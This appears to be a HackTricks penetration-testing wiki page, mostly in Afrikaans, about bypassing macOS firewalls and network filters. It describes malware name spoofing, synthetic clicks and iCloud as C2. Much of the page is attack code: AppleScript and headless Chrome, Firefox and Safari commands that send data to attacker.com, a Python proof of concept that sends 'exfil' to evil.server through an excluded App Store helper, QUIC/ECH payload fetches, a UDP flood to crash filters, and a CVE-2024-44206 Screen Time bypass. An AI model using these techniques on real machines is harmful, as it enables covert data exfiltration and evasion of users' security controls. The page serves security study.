# macOS-firewalls omseil

{{#include ../../banners/hacktricks-training.md}}

## Tegnieke wat gevind is

Die volgende tegnieke is gevind wat in sommige macOS-firewall-apps werk.

### Misbruik van whitelist-name

- Byvoorbeeld, noem die malware soos bekende macOS-prosesse, soos **`launchd`**

### Synthetic Click

- As die firewall die gebruiker vir toestemming vra, laat die malware **op allow klik**

### **Gebruik Apple-ondertekende binaries**

- Soos **`curl`**, maar ook ander soos **`whois`**

### Bekende Apple-domeine

Die firewall kan verbindings na bekende Apple-domeine soos **`apple.com`** of **`icloud.com`** toelaat. En iCloud kan as ’n C2 gebruik word.

### Algemene omseiling

Enkele idees om firewalls te probeer omseil

### Kontroleer toegelate verkeer

As jy weet watter verkeer toegelaat word, sal dit jou help om potensieel gewhitelistede domeine te identifiseer, of om te bepaal watter toepassings toegang daartoe mag verkry.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Misbruik van DNS

DNS-resolusies word uitgevoer via die **`mdnsreponder`**-ondertekende toepassing, wat waarskynlik toegelaat sal word om met DNS-bedieners te kommunikeer.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via Browser-toepassings

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via process injections

If you can **inject code into a process** that is allowed to connect to any server, you could bypass the firewall protections:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
In Julie 2024 het Apple ’n kritieke fout in Safari/WebKit reggemaak wat die stelselwye “Web content filter” gebreek het wat deur Screen Time se ouerbeheer gebruik word.
’n Spesiaal vervaardigde URI (byvoorbeeld met dubbel-URL-geënkodeerde “://”) word nie deur die Screen Time-ACL herken nie, maar word wel deur WebKit aanvaar, sodat die versoek ongefiltreerd uitgestuur word. Enige proses wat ’n URL kan oopmaak (insluitend sandboxed of unsigned code) kan dus domeine bereik wat uitdruklik deur die gebruiker of ’n MDM-profiel geblokkeer word.<sup>[2]</sup>

Praktiese toets (on-gepatchte stelsel):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF)-reëlordeningsfout in vroeë macOS 14 “Sonoma”
Tydens die macOS 14-beta-siklus het Apple ’n regressie in die userspace-wrapper rondom **`pfctl`** bekendgestel.
Reëls wat met die `quick`-keyword bygevoeg is (wat deur baie VPN kill-switches gebruik word), is stilweg geïgnoreer, wat traffic leaks veroorsaak het selfs wanneer ’n VPN/firewall GUI *blocked* gerapporteer het. Die bug is deur verskeie VPN-vendors bevestig en in RC 2 (build 23A344) reggestel.

Vinnige leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Misbruik van Apple-signed helper services (legacy – pre-macOS 11.2)
Voor macOS 11.2 het die **`ContentFilterExclusionList`** ongeveer 50 Apple-binaries, soos **`nsurlsessiond`** en die App Store, toegelaat om alle socket-filter firewalls wat met die Network Extension-framework geïmplementeer is (LuLu, Little Snitch, ens.), te omseil.
Malware kon eenvoudig ’n uitgeslote proses spawn — of kode daarin inject — en sy eie verkeer oor die reeds toegelate socket tunnel. Apple het die uitsluitingslys in macOS 11.2 heeltemal verwyder, maar die tegniek bly relevant op stelsels wat nie opgegradeer kan word nie.<sup>[3]</sup>

Voorbeeld van ’n proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH om Network Extension-domeinfilters te omseil (macOS 12+)
NEFilter Packet/Data Providers baseer hul werking op die TLS ClientHello SNI/ALPN. Met **HTTP/3 oor QUIC (UDP/443)** en **Encrypted Client Hello (ECH)** bly die SNI geïnkripteer, NetExt kan nie die vloei ontleed nie, en gasheernaamreëls faal dikwels oop, wat malware toelaat om geblokkeerde domeine te bereik sonder om DNS aan te raak.<sup>[5]</sup>

Minimale PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
As QUIC/ECH steeds enabled is, is dit ’n maklike hostname-filter evasion path.

### macOS 15 “Sequoia” Network Extension-onstabiliteit (2024–2025)
Vroeë 15.0/15.1 builds laat derdeparty-**Network Extension**-filters (LuLu, Little Snitch, Defender, SentinelOne, ens.) crash. Wanneer die filter herbegin, verwyder macOS sy flow rules, en baie produkte faal oop. Deur die filter met duisende kort UDP flows te oorstroom (of QUIC/ECH af te dwing), kan die crash herhaaldelik veroorsaak word en ’n venster vir C2/exfil gelaat word, terwyl die GUI steeds aandui dat die firewall loop.<sup>[4]</sup>

Vinnige reproduksie (veilige lab-box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Gereedskapwenke vir moderne macOS

1. Inspekteer huidige PF-reëls wat GUI-firewalls genereer:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Lys binaries wat reeds die *outgoing-network*-entitlement het (nuttig om op voort te bou):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registreer programmaties jou eie Network Extension-content filter in Objective-C/Swift.
’n Minimale rootless PoC wat pakkette na ’n plaaslike socket aanstuur, is beskikbaar in Patrick Wardle se **LuLu**-source code.

## Verwysings

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple verwyder macOS-funksie wat apps toegelaat het om firewall-sekuriteit te omseil - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
